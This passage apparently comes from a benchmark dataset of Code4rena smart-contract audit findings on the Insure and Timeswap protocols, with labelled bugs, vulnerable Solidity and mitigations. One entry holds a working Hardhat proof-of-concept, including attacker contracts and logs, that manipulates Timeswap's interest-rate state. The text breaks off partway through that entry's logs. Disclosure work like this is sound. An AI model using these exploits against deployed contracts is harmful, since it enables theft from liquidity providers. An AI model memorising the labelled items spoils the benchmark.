\"uint256\\n_shortage\\n=\\n_deductionFromIndex\\n/\\nMAGIC_SCALE_1E6\\n-\\n_actualDeduction\\n;\",\n      \"In some cases, specific pools will be liable for unfair compensation:\",\n      \"If the CSD is empty,Index Pool 1only have6,000 * 10**18andIndex Pool 2only have4,000 * 10**18, the_actualDeductionwill be10,000 * 10**18,_deductionFromPoolwill be0.\",\n      \"Index Pool 1should only pay1,000 * 10**18, but actually paid6,000 * 10**18, the LPs ofIndex Pool 1now suffer funds loss.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Change to:\",\n      \"uint256\\n_deductionFromIndex\\n= (\\n_debt\\n*\\n_totalCredit\\n*\\nMAGIC_SCALE_1E6\\n) /\\ntotalLiquidity\\n();\\nuint256\\n_actualDeduction\\n;\\nfor\\n(\\nuint256\\ni\\n=\\n0\\n;\\ni\\n<\\nindexList\\n.\\nlength\\n;\\ni\\n++) {\\naddress\\n_index\\n=\\nindexList\\n[\\ni\\n];\\nuint256\\n_credit\\n=\\nindicies\\n[\\n_index\\n].\\ncredit\\n;\\nif\\n(\\n_credit\\n>\\n0\\n) {\\nuint256\\n_shareOfIndex\\n= (\\n_credit\\n*\\nMAGIC_SCALE_1E6\\n) /\\n_totalCredit\\n;\\nuint256\\n_redeemAmount\\n=\\n_divCeil\\n(\\n_deductionFromIndex\\n*\\n_shareOfIndex\\n,\\nMAGIC_SCALE_1E6\\n*\\nMAGIC_SCALE_1E6\\n);\\n_actualDeduction\\n+=\\nIIndexTemplate\\n(\\n_index\\n).\\ncompensate\\n(\\n_redeemAmount\\n);\\n}\\n}\",\n      \"oishun1112 (Insure) confirmed and resolved\"\n    ]\n  },\n  {\n    \"row_number\": 147,\n    \"bug_id\": \" H-12\",\n    \"bug_label\": \" S5-2\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"IndexTemplate.sol Wrong implementation allows lp of the index pool to resume a locked PayingOut pool and escape the responsibility for the compensation\\\"\",\n    \"line\": \"IndexTemplate[469]\",\n    \"url\": \" https://code4rena.com/reports/2022-01-insure#h-12-indextemplatesol-wrong-implementation-allows-lp-of-the-index-pool-to-resume-a-locked-payingout-pool-and-escape-the-responsibility-for-the-compensation\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by WatchPug, also found by leastwood\",\n      \"Based on the context, the system intends to lock all the lps during PayingOut period.\",\n      \"However, the current implementation allows anyone, including LPs to callresume()and unlock the index pool.\",\n      \"It allows a malicious LP to escape the responsibility for the compensation, at the expense of other LPs paying more than expected.\",\n      \"https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L459-L471\"\n    ],\n    \"code_blocks\": [\n      \"function\\nresume\\n()\\nexternal\\noverride\\n{\\nuint256\\n_poolLength\\n=\\npoolList\\n.\\nlength\\n;\\nfor\\n(\\nuint256\\ni\\n=\\n0\\n;\\ni\\n<\\n_poolLength\\n;\\ni\\n++) {\\nrequire\\n(\\nIPoolTemplate\\n(\\npoolList\\n[\\ni\\n]).\\npaused\\n() ==\\nfalse\\n,\\n\\\"ERROR: POOL_IS_PAUSED\\\"\\n);\\n}\\nlocked\\n=\\nfalse\\n;\\nemit\\nResumed\\n();\\n}\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Change to:\",\n      \"function\\nresume\\n()\\nexternal\\noverride\\n{\\nuint256\\n_poolLength\\n=\\npoolList\\n.\\nlength\\n;\\nfor\\n(\\nuint256\\ni\\n=\\n0\\n;\\ni\\n<\\n_poolLength\\n;\\ni\\n++) {\\nrequire\\n(\\nIPoolTemplate\\n(\\npoolList\\n[\\ni\\n]).\\nmarketStatus\\n() ==\\nMarketStatus\\n.\\nTrading\\n,\\n\\\"ERROR: POOL_IS_PAYINGOUT\\\"\\n);\\n}\\nlocked\\n=\\nfalse\\n;\\nemit\\nResumed\\n();\\n}\",\n      \"oishun1112 (Insure) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 148,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S5-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"TimeswapPair.sol#borrow() Improper implementation allows attacker to increase pool.state.z to a large value\\\"\",\n    \"line\": \"TimeswapPair[299],BorrowMath[62]\",\n    \"url\": \" https://code4rena.com/reports/2022-01-timeswap#h-01-timeswappairsolborrow-improper-implementation-allows-attacker-to-increase-poolstatez-to-a-large-value\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by WatchPug\",\n      \"In the current implementation,borrow()takes a user input value ofzIncrease, while the actual collateral asset transferred in is calculated at L319, the state ofpool.state.zstill increased by the value of the user‚Äôs input at L332.\",\n      \"Even though a large number ofzIncreasemeans that the user needs to add more collateral, the attacker can use a dust amountxDecrease(1 wei for example) so that the total collateral needed is rather small.\",\n      \"Plus, the attacker can alwayspay()the dust amount of loan to get back the rather large amount of collateral added.\",\n      \"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L299-L338\",\n      \"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L62-L79\"\n    ],\n    \"code_blocks\": [\n      \"function\\nborrow\\n(\\nuint256\\nmaturity\\n,\\naddress\\nassetTo\\n,\\naddress\\ndueTo\\n,\\nuint112\\nxDecrease\\n,\\nuint112\\nyIncrease\\n,\\nuint112\\nzIncrease\\n,\\nbytes\\ncalldata\\ndata\\n)\\nexternal\\noverride\\nlock\\nreturns\\n(\\nuint256\\nid\\n,\\nDue\\nmemory\\ndueOut\\n) {\\nrequire\\n(\\nblock\\n.\\ntimestamp\\n<\\nmaturity\\n,\\n'E202'\\n);\\nrequire\\n(\\nassetTo\\n!=\\naddress\\n(\\n0\\n) &&\\ndueTo\\n!=\\naddress\\n(\\n0\\n),\\n'E201'\\n);\\nrequire\\n(\\nassetTo\\n!=\\naddress\\n(\\nthis\\n) &&\\ndueTo\\n!=\\naddress\\n(\\nthis\\n),\\n'E204'\\n);\\nrequire\\n(\\nxDecrease\\n>\\n0\\n,\\n'E205'\\n);\\nPool\\nstorage\\npool\\n=\\npools\\n[\\nmaturity\\n];\\nrequire\\n(\\npool\\n.\\nstate\\n.\\ntotalLiquidity\\n>\\n0\\n,\\n'E206'\\n);\\nBorrowMath\\n.\\ncheck\\n(\\npool\\n.\\nstate\\n,\\nxDecrease\\n,\\nyIncrease\\n,\\nzIncrease\\n,\\nfee\\n);\\ndueOut\\n.\\ndebt\\n=\\nBorrowMath\\n.\\ngetDebt\\n(\\nmaturity\\n,\\nxDecrease\\n,\\nyIncrease\\n);\\ndueOut\\n.\\ncollateral\\n=\\nBorrowMath\\n.\\ngetCollateral\\n(\\nmaturity\\n,\\npool\\n.\\nstate\\n,\\nxDecrease\\n,\\nzIncrease\\n);\\ndueOut\\n.\\nstartBlock\\n=\\nBlockNumber\\n.\\nget\\n();\\nCallback\\n.\\nborrow\\n(\\ncollateral\\n,\\ndueOut\\n.\\ncollateral\\n,\\ndata\\n);\\nid\\n=\\npool\\n.\\ndues\\n[\\ndueTo\\n].\\ninsert\\n(\\ndueOut\\n);\\npool\\n.\\nstate\\n.\\nreserves\\n.\\nasset\\n-=\\nxDecrease\\n;\\npool\\n.\\nstate\\n.\\nreserves\\n.\\ncollateral\\n+=\\ndueOut\\n.\\ncollateral\\n;\\npool\\n.\\nstate\\n.\\ntotalDebtCreated\\n+=\\ndueOut\\n.\\ndebt\\n;\\npool\\n.\\nstate\\n.\\nx\\n-=\\nxDecrease\\n;\\npool\\n.\\nstate\\n.\\ny\\n+=\\nyIncrease\\n;\\npool\\n.\\nstate\\n.\\nz\\n+=\\nzIncrease\\n;\\nasset\\n.\\nsafeTransfer\\n(\\nassetTo\\n,\\nxDecrease\\n);\\nemit\\nSync\\n(\\nmaturity\\n,\\npool\\n.\\nstate\\n.\\nx\\n,\\npool\\n.\\nstate\\n.\\ny\\n,\\npool\\n.\\nstate\\n.\\nz\\n);\\nemit\\nBorrow\\n(\\nmaturity\\n,\\nmsg\\n.\\nsender\\n,\\nassetTo\\n,\\ndueTo\\n,\\nxDecrease\\n,\\nid\\n,\\ndueOut\\n);\\n}\",\n      \"function\\ngetCollateral\\n(\\nuint256\\nmaturity\\n,\\nIPair.State\\nmemory\\nstate\\n,\\nuint112\\nxDecrease\\n,\\nuint112\\nzIncrease\\n)\\ninternal\\nview\\nreturns\\n(\\nuint112\\ncollateralIn\\n) {\\nuint256\\n_collateralIn\\n=\\nmaturity\\n;\\n_collateralIn\\n-=\\nblock\\n.\\ntimestamp\\n;\\n_collateralIn\\n*=\\nzIncrease\\n;\\n_collateralIn\\n=\\n_collateralIn\\n.\\nshiftRightUp\\n(\\n25\\n);\\nuint256\\nminimum\\n=\\nstate\\n.\\nz\\n;\\nminimum\\n*=\\nxDecrease\\n;\\nuint256\\ndenominator\\n=\\nstate\\n.\\nx\\n;\\ndenominator\\n-=\\nxDecrease\\n;\\nminimum\\n=\\nminimum\\n.\\ndivUp\\n(\\ndenominator\\n);\\n_collateralIn\\n+=\\nminimum\\n;\\ncollateralIn\\n=\\n_collateralIn\\n.\\ntoUint112\\n();\\n}\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Near the maturity time, the attacker can do the following:\",\n      \"borrow()a dust amount of assets (xDecrease= 1 wei) and increasepool.state.zto an extremely large value (20x of previousstate.zin our tests);pay()the loan and get back the collateral;lend()a regular amount ofstate.x, get a large amount of insurance token;burn()the insurance token and get a large portion of the collateral assets from the defaulted loans.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Consider makingpair.borrow()to beonlyConvenience, so thatzIncreasewill be a computed value (based onxDecreaseand current state) rather than a user input value.\",\n      \"Mathepreneur (Timeswap) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 149,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S5-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"TimeswapConvenience.sol#borrowGivenDebt() Attacker can increase state.y to an extremely large value with a dust amount of assetOut\\\"\",\n    \"line\": \"BorrowMath[19,31],LendMath[28]\",\n    \"url\": \" https://code4rena.com/reports/2022-01-timeswap#h-02-timeswapconveniencesolborrowgivendebt-attacker-can-increase-statey-to-an-extremely-large-value-with-a-dust-amount-of-assetout\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by WatchPug\",\n      \"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/BorrowMath.sol#L19-L53\",\n      \"This issue is similar to the two previous issues related tostate.ymanipulation. Unlike the other two issues, this function is not onTimeswapPair.solbut onTimeswapConvenience.sol, therefore this can not be solved by addingonlyConveniencemodifier.\",\n      \"Actually, we believe that it does not make sense for the caller to specify the interest they want to pay, we recommend removing this function.\",\n      \"Whenpool.state.yis extremely large, many core features of the protocol will malfunction, as the arithmetic related tostate.ycan overflow. For example:\",\n      \"LendMath.check():https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/LendMath.sol#L28-L28\",\n      \"BorrowMath.check():https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L31-L31\",\n      \"An attacker can setstate.yto a near overflow value, thenlend()to get a large amount of extra interest (as Bond tokens) with a small amount of asset tokens. This way, the attacker can steal funds from other lenders and liquidity providers.\",\n      \"Mathepreneur (Timeswap) confirmed\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 150,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S5-1\",\n    \"difficulty\": 4,\n    \"bug_description\": \" \\\"Manipulation of the Y State Results in Interest Rate Manipulation\\\"\",\n    \"line\": \"TimeswapPair[131]\",\n    \"url\": \" https://code4rena.com/reports/2022-01-timeswap#h-03-manipulation-of-the-y-state-results-in-interest-rate-manipulation\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by Rhynorater, also found by harleythedog, hyh, and WatchPug\",\n      \"Due to lack of constraints on user input in theTimeswapPair.sol#mintfunction, an attacker can arbitrarily modify the interest rate while only paying a minimal amount of Asset Token and Collateral Token.\",\n      \"Disclosure: This is my first time attempting Ethereum hacking, so I might have made some mistakes here since the math is quite complex, but I‚Äôm going to give it a go.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"The attack scenario is this: A malicious actor is able to hyper-inflate the interest rate on a pool by triggering a malicious mint function. The malicious actor does this to attack the LP and other members of the pool.\",\n      \"Consider the following HardHat script:\",\n      \"const\\nhre\\n=\\nrequire\\n(\\n\\\"hardhat\\\"\\n);\\n//jtok is asset\\n//usdc is collat\\nasync\\nfunction\\nlaunchTestTokens\\n(\\ntokenDeployer\\n){\\n//Launch a token\\nconst\\nTestToken\\n=\\nawait\\nethers\\n.\\ngetContractFactory\\n(\\n\\\"TestToken\\\"\\n,\\nsigner\\n=\\ntokenDeployer\\n);\\nconst\\ntt\\n=\\nawait\\nTestToken\\n.\\ndeploy\\n(\\n\\\"JTOK\\\"\\n,\\n\\\"JTOK\\\"\\n,\\n1000000000000000\\n)\\nconst\\ntt2\\n=\\nawait\\nTestToken\\n.\\ndeploy\\n(\\n\\\"USDC\\\"\\n,\\n\\\"USDC\\\"\\n,\\n1000000000000000\\n)\\nlet\\nres\\n=\\nawait\\ntt\\n.\\nbalanceOf\\n(\\ntokenDeployer\\n.\\naddress\\n)\\nlet\\nres2\\n=\\nawait\\ntt\\n.\\nbalanceOf\\n(\\ntokenDeployer\\n.\\naddress\\n)\\nconsole\\n.\\nlog\\n(\\n\\\"JTOK balance: \\\"\\n+\\nres\\n)\\nconsole\\n.\\nlog\\n(\\n\\\"USDC balance: \\\"\\n+\\nres2\\n)\\nreturn\\n[\\ntt\\n,\\ntt2\\n]\\n}\\nasync\\nfunction\\ndeployAttackersContract\\n(\\nattacker\\n,\\njtok\\n,\\nusdc\\n){\\nconst\\nAtt\\n=\\nawait\\nethers\\n.\\ngetContractFactory\\n(\\n\\\"Attacker\\\"\\n,\\nsigner\\n=\\nattacker\\n)\\nconst\\natakcontrak\\n=\\nawait\\nAtt\\n.\\ndeploy\\n(\\njtok\\n.\\naddress\\n,\\nusdc\\n.\\naddress\\n)\\nreturn\\natakcontrak\\n}\\nasync\\nfunction\\ndeployLPContract\\n(\\nlp\\n,\\njtok\\n,\\nusdc\\n){\\nconst\\nLP\\n=\\nawait\\nethers\\n.\\ngetContractFactory\\n(\\n\\\"LP\\\"\\n,\\nsigner\\n=\\nlp\\n)\\nconst\\nlpc\\n=\\nawait\\nLP\\n.\\ndeploy\\n(\\njtok\\n.\\naddress\\n,\\nusdc\\n.\\naddress\\n)\\nreturn\\nlpc\\n}\\nasync\\nfunction\\nmain\\n() {\\nconst\\n[\\ntokenDeployer\\n,\\nlp\\n,\\nattacker\\n] =\\nawait\\nethers\\n.\\ngetSigners\\n();\\nlet\\nbalance\\n=\\nawait\\ntokenDeployer\\n.\\ngetBalance\\n()\\nlet\\nfactory\\n=\\nawait\\nethers\\n.\\ngetContractAt\\n(\\n\\\"TimeswapFactory\\\"\\n,\\n\\\"0x5FbDB2315678afecb367f032d93F642f64180aa3\\\"\\n,\\nsigner\\n=\\ntokenDeployer\\n)\\n//let [jtok, usdc] = await launchTestTokens(tokenDeployer)\\nlet\\njtok\\n=\\nawait\\nethers\\n.\\ngetContractAt\\n(\\n\\\"TestToken\\\"\\n,\\n\\\"0x2279b7a0a67db372996a5fab50d91eaa73d2ebe6\\\"\\n,\\nsigner\\n=\\ntokenDeployer\\n)\\nlet\\nusdc\\n=\\nawait\\nethers\\n.\\ngetContractAt\\n(\\n\\\"TestToken\\\"\\n,\\n\\\"0x8a791620dd6260079bf849dc5567adc3f2fdc318\\\"\\n,\\nsigner\\n=\\ntokenDeployer\\n)\\nconsole\\n.\\nlog\\n(\\n\\\"Jtok: \\\"\\n+\\njtok\\n.\\naddress\\n)\\nconsole\\n.\\nlog\\n(\\n\\\"USDC: \\\"\\n+\\nusdc\\n.\\naddress\\n)\\n//Create Pair\\n//let txn = await factory.createPair(jtok.address, usdc.address)\\npairAddress\\n=\\nawait\\nfactory\\n.\\ngetPair\\n(\\njtok\\n.\\naddress\\n,\\nusdc\\n.\\naddress\\n)\\npair\\n=\\nawait\\nethers\\n.\\ngetContractAt\\n(\\n\\\"TimeswapPair\\\"\\n,\\npairAddress\\n,\\nsigner\\n=\\ntokenDeployer\\n)\\nconsole\\n.\\nlog\\n(\\n\\\"Pair address: \\\"\\n+\\npairAddress\\n);\\n// Deploy LP\\n//let lpc = await deployLPContract(lp, jtok, usdc)\\nlet\\nlpc\\n=\\nawait\\nethers\\n.\\ngetContractAt\\n(\\n\\\"LP\\\"\\n,\\n\\\"0x948b3c65b89df0b4894abe91e6d02fe579834f8f\\\"\\n,\\nsigner\\n=\\nlp\\n)\\nlet\\njtokb\\n=\\nawait\\njtok\\n.\\nbalanceOf\\n(\\nlpc\\n.\\naddress\\n)\\nlet\\nusdcb\\n=\\nawait\\nusdc\\n.\\nbalanceOf\\n(\\nlpc\\n.\\naddress\\n)\\nconsole\\n.\\nlog\\n(\\n\\\"LP Jtok: \\\"\\n+\\njtokb\\n)\\nconsole\\n.\\nlog\\n(\\n\\\"LP USDC: \\\"\\n+\\nusdcb\\n)\\n//let txn2 = await lpc.timeswapMint(1641859791, 15, pairAddress)\\nlet\\nres\\n=\\nawait\\npair\\n.\\nconstantProduct\\n(\\n1641859791\\n);\\nconsole\\n.\\nlog\\n(\\n\\\"Post LP Constants:\\\"\\n,\\nres\\n);\\nlet\\natakcontrak\\n=\\nawait\\ndeployAttackersContract\\n(\\nattacker\\n,\\njtok\\n,\\nusdc\\n)\\njtokb\\n=\\nawait\\njtok\\n.\\nbalanceOf\\n(\\natakcontrak\\n.\\naddress\\n)\\nusdcb\\n=\\nawait\\nusdc\\n.\\nbalanceOf\\n(\\natakcontrak\\n.\\naddress\\n)\\nconsole\\n.\\nlog\\n(\\n\\\"Attacker Jtok: \\\"\\n+\\njtokb\\n)\\nconsole\\n.\\nlog\\n(\\n\\\"Attacker USDC: \\\"\\n+\\nusdcb\\n)\\n//mint some tokens\\nlet\\ntxn2\\n=\\nawait\\natakcontrak\\n.\\ntimeswapMint\\n(\\n1641859791\\n,\\n15\\n,\\npairAddress\\n)\\nlet\\nres2\\n=\\nawait\\npair\\n.\\nconstantProduct\\n(\\n1641859791\\n);\\nconsole\\n.\\nlog\\n(\\n\\\"Post Attack Constants:\\\"\\n,\\nres2\\n);\\n}\\nmain\\n().\\nthen\\n(()\\n=>\\nprocess\\n.\\nexit\\n(\\n0\\n))\",\n      \"First, the LP deploys their pool and contributes their desired amount of tokens with the below contract:\",\n      \"pragma\\nsolidity\\n=\\n0.8\\n.\\n4\\n;\\nimport\\n\\\"hardhat/console.sol\\\"\\n;\\nimport\\n{\\nITimeswapMintCallback\\n}\\nfrom\\n\\\"./interfaces/callback/ITimeswapMintCallback.sol\\\"\\n;\\nimport\\n{\\nIPair\\n}\\nfrom\\n\\\"./interfaces/IPair.sol\\\"\\n;\\nimport\\n{\\nIERC20\\n}\\nfrom\\n'@openzeppelin/contracts/token/ERC20/IERC20.sol'\\n;\\ninterface\\nTestTokenLP\\nis\\nIERC20\\n{\\nfunction\\nmmint\\n(\\nuint256\\namount\\n)\\nexternal\\n;\\n}\\ncontract\\nLP\\nis\\nITimeswapMintCallback\\n{\\nuint112\\nconstant\\nSEC_PER_YEAR\\n=\\n31556926\\n;\\nTestTokenLP\\ninternal\\njtok\\n;\\nTestTokenLP\\ninternal\\nusdc\\n;\\nconstructor\\n(\\naddress\\n_jtok\\n,\\naddress\\n_usdc\\n){\\njtok\\n=\\nTestTokenLP\\n(\\n_jtok\\n);\\njtok\\n.\\nmmint\\n(\\n10_000\\nether\\n);\\nusdc\\n=\\nTestTokenLP\\n(\\n_usdc\\n);\\nusdc\\n.\\nmmint\\n(\\n10_000\\nether\\n);\\n}\\nfunction\\ntimeswapMint\\n(\\nuint\\nmaturity\\n,\\nuint112\\nAPR\\n,\\naddress\\npairAddress\\n)\\npublic\\n{\\nuint256\\nmaturity\\n=\\nmaturity\\n;\\nconsole\\n.\\nlog\\n(\\n\\\"Maturity: \\\"\\n,\\nmaturity\\n);\\naddress\\nliquidityTo\\n=\\naddress\\n(\\nthis\\n);\\naddress\\ndueTo\\n=\\naddress\\n(\\nthis\\n);\\nuint112\\nxIncrease\\n=\\n5_000\\nether\\n;\\nuint112\\nyIncrease\\n= (\\nAPR\\n*\\nxIncrease\\n)/(\\nSEC_PER_YEAR\\n*\\n100\\n);\\nuint112\\nzIncrease\\n= (\\n5\\n*\\nxIncrease\\n)/\\n3\\n;\\n//Static 167% CDP\\nIPair\\n(\\npairAddress\\n).\\nmint\\n(\\nmaturity\\n,\\nliquidityTo\\n,\\ndueTo\\n,\\nxIncrease\\n,\\nyIncrease\\n,\\nzIncrease\\n,\\n\\\"\\\"\\n);\\n}\\nfunction\\ntimeswapMintCallback\\n(\\nuint112\\nassetIn\\n,\\nuint112\\ncollateralIn\\n,\\nbytes\\ncalldata\\ndata\\n)\\noverride\\nexternal\\n{\\njtok\\n.\\nmmint\\n(\\n100_000\\nether\\n);\\nusdc\\n.\\nmmint\\n(\\n100_000\\nether\\n);\\nconsole\\n.\\nlog\\n(\\n\\\"Asset requested:\\\"\\n,\\nassetIn\\n);\\nconsole\\n.\\nlog\\n(\\n\\\"Collateral requested:\\\"\\n,\\ncollateralIn\\n);\\n//check before\\nuint256\\nbeforeJtok\\n=\\njtok\\n.\\nbalanceOf\\n(\\nmsg\\n.\\nsender\\n);\\nconsole\\n.\\nlog\\n(\\n\\\"LP jtok before\\\"\\n,\\nbeforeJtok\\n);\\n//transfer\\njtok\\n.\\ntransfer\\n(\\nmsg\\n.\\nsender\\n,\\nassetIn\\n);\\n//check after\\nuint256\\nafterJtok\\n=\\njtok\\n.\\nbalanceOf\\n(\\nmsg\\n.\\nsender\\n);\\nconsole\\n.\\nlog\\n(\\n\\\"LP jtok after\\\"\\n,\\nafterJtok\\n);\\n//check before\\nuint256\\nbeforeUsdc\\n=\\nusdc\\n.\\nbalanceOf\\n(\\nmsg\\n.\\nsender\\n);\\nconsole\\n.\\nlog\\n(\\n\\\"LP USDC  before\\\"\\n,\\nbeforeUsdc\\n);\\n//transfer\\nusdc\\n.\\ntransfer\\n(\\nmsg\\n.\\nsender\\n,\\ncollateralIn\\n);\\n//check after\\nuint256\\nafterUsdc\\n=\\nusdc\\n.\\nbalanceOf\\n(\\nmsg\\n.\\nsender\\n);\\nconsole\\n.\\nlog\\n(\\n\\\"LP USDC After\\\"\\n,\\nafterUsdc\\n);\\n}\\n}\",\n      \"Here are the initialization values:\",\n      \"uint112\\nxIncrease\\n=\\n5_000\\nether\\n;\\nuint112\\nyIncrease\\n= (\\nAPR\\n*\\nxIncrease\\n)/(\\nSEC_PER_YEAR\\n*\\n100\\n);\\nuint112\\nzIncrease\\n= (\\n5\\n*\\nxIncrease\\n)/\\n3\\n;\\n//Static 167% CDP\",\n      \"With this configuration, I‚Äôve calculated the interest rate to borrow on this pool using the functions defined here:https://timeswap.gitbook.io/timeswap/deep-dive/borrowingto  be:\",\n      \"yMax: 4.7533146923118e-06\\nMin Interest Rate: 0.009374999999999765\\nMax Interest Rate: 0.14999999999999625\\nzMax: 1666.6666666666667\",\n      \"Around 1% to 15%.\",\n      \"Then, the attacker comes along (see line containinglet atakcontrakand after). The attacker deploys the following contract:\",\n      \"pragma\\nsolidity\\n=\\n0.8\\n.\\n4\\n;\\nimport\\n\\\"hardhat/console.sol\\\"\\n;\\nimport\\n{\\nITimeswapMintCallback\\n}\\nfrom\\n\\\"./interfaces/callback/ITimeswapMintCallback.sol\\\"\\n;\\nimport\\n{\\nIPair\\n}\\nfrom\\n\\\"./interfaces/IPair.sol\\\"\\n;\\nimport\\n{\\nIERC20\\n}\\nfrom\\n'@openzeppelin/contracts/token/ERC20/IERC20.sol'\\n;\\ninterface\\nTestTokenAtt\\nis\\nIERC20\\n{\\nfunction\\nmmint\\n(\\nuint256\\namount\\n)\\nexternal\\n;\\n}\\ncontract\\nAttacker\\nis\\nITimeswapMintCallback\\n{\\nuint112\\nconstant\\nSEC_PER_YEAR\\n=\\n31556926\\n;\\nTestTokenAtt\\ninternal\\njtok\\n;\\nTestTokenAtt\\ninternal\\nusdc\\n;\\nconstructor\\n(\\naddress\\n_jtok\\n,\\naddress\\n_usdc\\n){\\njtok\\n=\\nTestTokenAtt\\n(\\n_jtok\\n);\\njtok\\n.\\nmmint\\n(\\n10_000\\nether\\n);\\nusdc\\n=\\nTestTokenAtt\\n(\\n_usdc\\n);\\nusdc\\n.\\nmmint\\n(\\n10_000\\nether\\n);\\n}\\nfunction\\ntimeswapMint\\n(\\nuint\\nmaturity\\n,\\nuint112\\nAPR\\n,\\naddress\\npairAddress\\n)\\npublic\\n{\\nuint256\\nmaturity\\n=\\nmaturity\\n;\\nconsole\\n.\\nlog\\n(\\n\\\"Maturity: \\\"\\n,\\nmaturity\\n);\\naddress\\nliquidityTo\\n=\\naddress\\n(\\nthis\\n);\\naddress\\ndueTo\\n=\\naddress\\n(\\nthis\\n);\\nuint112\\nxIncrease\\n=\\n3\\n;\\nuint112\\nyIncrease\\n=\\n1000000000000000\\n;\\nuint112\\nzIncrease\\n=\\n5\\n;\\n//Static 167% CDP\\nIPair\\n(\\npairAddress\\n).\\nmint\\n(\\nmaturity\\n,\\nliquidityTo\\n,\\ndueTo\\n,\\nxIncrease\\n,\\nyIncrease\\n,\\nzIncrease\\n,\\n\\\"\\\"\\n);\\n}\\nfunction\\ntimeswapMintCallback\\n(\\nuint112\\nassetIn\\n,\\nuint112\\ncollateralIn\\n,\\nbytes\\ncalldata\\ndata\\n)\\noverride\\nexternal\\n{\\njtok\\n.\\nmmint\\n(\\n100_000\\nether\\n);\\nusdc\\n.\\nmmint\\n(\\n100_000\\nether\\n);\\nconsole\\n.\\nlog\\n(\\n\\\"Asset requested:\\\"\\n,\\nassetIn\\n);\\nconsole\\n.\\nlog\\n(\\n\\\"Collateral requested:\\\"\\n,\\ncollateralIn\\n);\\n//check before\\nuint256\\nbeforeJtok\\n=\\njtok\\n.\\nbalanceOf\\n(\\nmsg\\n.\\nsender\\n);\\nconsole\\n.\\nlog\\n(\\n\\\"Attacker jtok before\\\"\\n,\\nbeforeJtok\\n);\\n//transfer\\njtok\\n.\\ntransfer\\n(\\nmsg\\n.\\nsender\\n,\\nassetIn\\n);\\n//check after\\nuint256\\nafterJtok\\n=\\njtok\\n.\\nbalanceOf\\n(\\nmsg\\n.\\nsender\\n);\\nconsole\\n.\\nlog\\n(\\n\\\"Attacker jtok after\\\"\\n,\\nafterJtok\\n);\\n//check before\\nuint256\\nbeforeUsdc\\n=\\nusdc\\n.\\nbalanceOf\\n(\\nmsg\\n.\\nsender\\n);\\nconsole\\n.\\nlog\\n(\\n\\\"Attacker USDC  before\\\"\\n,\\nbeforeUsdc\\n);\\n//transfer\\nusdc\\n.\\ntransfer\\n(\\nmsg\\n.\\nsender\\n,\\ncollateralIn\\n);\\n//check after\\nuint256\\nafterUsdc\\n=\\nusdc\\n.\\nbalanceOf\\n(\\nmsg\\n.\\nsender\\n);\\nconsole\\n.\\nlog\\n(\\n\\\"Attacker USDC After\\\"\\n,\\nafterUsdc\\n);\\n}\\n}\",\n      \"Which contains the following settings for a mint:\",\n      \"uint112\\nxIncrease\\n=\\n3\\n;\\nuint112\\nyIncrease\\n=\\n1000000000000000\\n;\\nuint112\\nzIncrease\\n=\\n5\\n;\\n//Static 167% CDP\",\n      \"According to my logs in hardhat:\",\n      \"Maturity:  1641859791\\nCallback before: 8333825816710789998373\\nAsset requested: 3\\nCollateral requested: 6\\nAttacker jtok before 5000000000000000000000\\nAttacker jtok after 5000000000000000000003\\nAttacker USDC  before 8333825816710789998373\\nAttacker USDC After 8333825816710789998379\\nCallback after: 8333825816710789998379\\nCallback expected after: 8333825816710789998379\",\n      \"The attacker is only required to pay 3 wei of Asset Token and 6 wei of Collateral token. However, after the attacker‚Äôs malicious mint is up, the interest rate becomes:\",\n      \"yMax: 0.0002047533146923118\\nMin Interest Rate: 0.40383657499999975\\nMax Interest Rate: 6.461385199999996\\nzMax: 1666.6666666666667\",\n      \"Between 40 and 646 percent.\",\n      \"xyz values before and after:\",\n      \"Post LP Constants: [ BigNumber { value: \\\"5000000000000000000000\\\" },\\nBigNumber { value: \\\"23766573461559\\\" },\\nBigNumber { value: \\\"8333333333333333333333\\\" },\\nx: BigNumber { value: \\\"5000000000000000000000\\\" },\\ny: BigNumber { value: \\\"23766573461559\\\" },\\nz: BigNumber { value: \\\"8333333333333333333333\\\" } ]\\nAttacker Jtok: 10000000000000000000000\\nAttacker USDC: 10000000000000000000000\\nPost Attack Constants: [ BigNumber { value: \\\"5000000000000000000003\\\" },\\nBigNumber { value: \\\"1023766573461559\\\" },\\nBigNumber { value: \\\"8333333333333333333338\\\" },\\nx: BigNumber { value: \\\"5000000000000000000003\\\" },\\ny: BigNumber { value: \\\"1023766573461559\\\" },\\nz: BigNumber { value: 